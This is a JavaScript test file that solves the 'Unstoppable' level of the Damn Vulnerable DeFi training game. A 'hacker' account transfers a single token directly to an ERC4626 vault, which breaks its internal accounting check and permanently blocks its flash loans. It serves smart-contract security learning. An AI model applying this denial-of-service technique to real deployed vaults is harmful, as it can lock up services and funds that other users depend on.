const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");


describe("Unstoppable Damn Vulnerable DEFI", function(){

    let owner, account1, hacker,
        DVT_Token, dvtToken,
        Unstoppable,unstoppable, Vault, vault;

    before(async()=>{

        [owner, account1, hacker] = await ethers.getSigners();

        //Deploy Token
        DVT_Token = await ethers.getContractFactory("DVT_Token");
        dvtToken = await DVT_Token.deploy()
        await dvtToken.deployed()


        //Deploy UnstoppableVault
        Vault = await ethers.getContractFactory("UnstoppableVault");
        vault = await Vault.deploy(dvtToken.address, owner.address, owner.address);
        await vault.deployed()


        //Deploy ReceiverUnstoppable
        Unstoppable = await ethers.getContractFactory("ReceiverUnstoppable");
        unstoppable = await Unstoppable.deploy(vault.address);
        await unstoppable.deployed();


        //Approve our new token to the vault address
        await dvtToken.approve(vault.address, ethers.utils.parseEther("50000"));


        //We are using ERC4626,an extension of ERC20 from solmate.
        //We need to use deposit function to send some of our tokens to Vautl contract
        await vault.deposit(ethers.utils.parseEther("50000"), vault.address);


        let supply = await vault.totalSupply();
        console.log("Total Supply:", (supply/10**18).toString(), "DVT");

        await dvtToken.transfer(hacker.address, ethers.utils.parseEther("10"));

        let vaultBalance = await dvtToken.balanceOf(vault.address);
        let hackerBalance = await dvtToken.balanceOf(hacker.address);
        console.log("Vault contract balance:", (vaultBalance/10**18).toString(), "DVT");
        console.log("Hacker balance:", (hackerBalance/10**18).toString(), "DVT");
        console.log("");
    });



    it("Exploit Begin Here",async()=>{
        let vaultContractConvertToShareBefore = await vault.convertToShares(ethers.utils.parseEther("50000"));
        console.log("VaultContract convertToShare:", (vaultContractConvertToShareBefore/10**18).toString(), "DVT");

        let vaultContractTotalAsset = await vault.totalAssets();
        console.log("VaultContract DVT Total Asset:", (vaultContractTotalAsset/10**18).toString(), "DVT");

        console.log("");


        //Send only one token, and the contract will be in DoS, because at line 96 of UnstoppableVault.sol
        //if statement, will never satisfied anymore

        await dvtToken.connect(hacker).transfer(vault.address, 1);


        let vaultContractConvertToShareAfter = await vault.convertToShares(ethers.utils.parseEther("50000"));
        console.log("VaultContract convertToShare:", (vaultContractConvertToShareAfter/10**18).toString(), "DVT");

        let vaultContractTotalAssetAfter = await vault.totalAssets();
        console.log("VaultContract DVT Total Asset After:", (vaultContractTotalAssetAfter/10**18).toString(), "DVT");

    });


    //FlashLoan in DoS
    it("Exploit: Contract UnstoppableVault is in DoS", async()=>{
        await unstoppable.connect(owner).executeFlashLoan(ethers.utils.parseEther("5"));
    })
})